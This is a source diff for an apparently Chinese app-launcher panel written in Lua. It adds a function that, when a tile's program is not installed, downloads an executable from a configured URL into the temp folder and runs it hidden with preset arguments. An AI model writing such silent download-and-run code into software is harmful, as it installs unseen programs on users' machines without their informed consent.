@@ -76,8 +76,6 @@ end
 
 function TryCreateAppItem(objAppContainer, tAppItem, nIndex)
 	local strAppName = tAppItem["strAppName"]
-	local nOpenType = tAppItem["nOpenType"]
-	local strOpenLink = tAppItem["strOpenLink"]
 	local strImagePath = tAppItem["strImagePath"]
 	
 	if IsRealString(strImagePath) and tipUtil:QueryFileExists(strImagePath) then
@@ -88,8 +86,8 @@ function TryCreateAppItem(objAppContainer, tAppItem, nIndex)
 			
 			objAppItemCtrl:SetAppName(strAppName)
 			objAppItemCtrl:SetAppImageByPath(strImagePath)
-			objAppItemCtrl:SetAppOpenType(nOpenType)
-			objAppItemCtrl:SetAppOpenLink(strOpenLink)
+			objAppItemCtrl:SetAppInfo(tAppItem)
+			
 			objAppItemCtrl:SetRedirect("OnMouseWheel", "control:listbox.vscroll")
 			
 			return true
@@ -343,23 +341,13 @@ function SetAppImageByPath(self, strImagePath, strColorType)
 	objImage:SetBitmap(objBitmap)
 end
 
-function SetAppOpenLink(self, strLink)
-	if not IsRealString(strLink) then
+function SetAppInfo(self, tItemInfo)
+	if type(tItemInfo)~="table" then
 		return
 	end
 	
 	local attr = self:GetAttribute()
-	attr.strOpenLink = strLink
-end
-
---1:浏览器打开;2:直接下载或运行
-function SetAppOpenType(self, nType)
-	if tonumber(nType) == nil then
-		return
-	end
-	
-	local attr = self:GetAttribute()
-	attr.nOpenType = tonumber(nType)
+	attr.tItemInfo = tItemInfo
 end
 
 
@@ -372,11 +360,13 @@ function OnClickAppText(objAppText)
 end
 
 
+--1:浏览器打开;2:直接下载或运行
 function OpenLinkAfterClick(objUIItem)
 	local objRootCtrl = objUIItem:GetOwnerControl()
 	local attr = objRootCtrl:GetAttribute()
-	local nOpenType = attr.nOpenType
-	local strOpenLink = attr.strOpenLink
+	local tItemInfo = attr.tItemInfo
+	local nOpenType = tItemInfo.nOpenType
+	local strOpenLink = tItemInfo.strOpenLink
 	
 	if not IsRealString(strOpenLink) then
 		return
@@ -385,19 +375,67 @@ function OpenLinkAfterClick(objUIItem)
 	if nOpenType == 1 then
 		tipUtil:OpenURL(strOpenLink)
 	elseif nOpenType == 2 then
-		OpenSoftware(strOpenLink)
+		OpenSoftware(objUIItem, tItemInfo)
 	end	
 end
 
 
-function OpenSoftware(strOpenLink)
+function OpenSoftware(objUIItem, tItemInfo)
+	local strRegPath = tItemInfo.strRegPath or ""
+	local strExeName = tItemInfo.strExeName or ""
+	
+	local strInstallDir = RegQueryValue(strRegPath)
+	if string.lower(strExeName) == "baidusd.exe" then
+		local strVersion = RegQueryValue(tItemInfo.strRegVersion)
+		strInstallDir = tipUtil:PathCombine(strInstallDir, strVersion)
+	end
+	local strInstallPath = tipUtil:PathCombine(strInstallDir, strExeName)
+	
+	if IsRealString(strInstallDir) and tipUtil:QueryFileExists(strInstallPath) then
+		tipUtil:ShellExecute(0, "open", strInstallPath, 0, 0, "SW_SHOWNORMAL")
+	else
+		DownSoftwareSilently(objUIItem, tItemInfo)
+	end
+end
 
+function DownSoftwareSilently(objUIItem, tItemInfo)
+	local objRootCtrl = objUIItem:GetOwnerControl()
+	local attr = objRootCtrl:GetAttribute()
+	if attr.bIsDownLoading then
+		return
+	end
+	attr.bIsDownLoading = true
+	
+	local strOpenLink = tItemInfo.strOpenLink
+	local strCommand = tItemInfo.strCommand or ""
+	if not IsRealString(strOpenLink) then
+		return
+	end
+	
+	local strSaveDir = tipUtil:GetSystemTempPath()
+	local strFileName = GetFileSaveNameFromUrl(strOpenLink)	
+	if not string.find(strFileName, "%.exe$") then
+		strFileName = strFileName..".exe"
+	end
+	local strSavePath = tipUtil:PathCombine(strSaveDir, strFileName)
+	tipAsynUtil:AsynGetHttpFile(strOpenLink, strSavePath, false
+	, function(bRet, strRealPath)
+		TipLog("[DownSoftwareSilently] strOpenLink:"..tostring(strOpenLink)
+		        .."  bRet:"..tostring(bRet).."  strRealPath:"..tostring(strRealPath))
+				
+		attr.bIsDownLoading = false
+		if 0 ~= bRet then
+			return
+		end
+		
+		tipUtil:ShellExecute(0, "open", strRealPath, strCommand, 0, "SW_HIDE")
+	end)	
 end
 
 
 ----------------------------------------------------
 function IsRealString(str)
-	return type(str) == "string" and str~=nil
+	return type(str) == "string" and str~=""
 end
 
 
@@ -407,5 +445,22 @@ function TipLog(strLog)
 	end
 end
 
+function RegQueryValue(sPath)
+	if IsRealString(sPath) then
+		local sRegRoot, sRegPath, sRegKey = string.match(sPath, "^(.-)[\\/](.*)[\\/](.-)$")
+		if IsRealString(sRegRoot) and IsRealString(sRegPath) then
+			return tipUtil:QueryRegValue(sRegRoot, sRegPath, sRegKey or "") or ""
+		end
+	end
+	return ""
+end
 
+function GetFileSaveNameFromUrl(url)
+	local _, _, strFileName = string.find(tostring(url), ".*/(.*)$")
+	local npos = string.find(strFileName, "?", 1, true)
+	if npos ~= nil then
+		strFileName = string.sub(strFileName, 1, npos-1)
+	end
+	return strFileName
+end
 
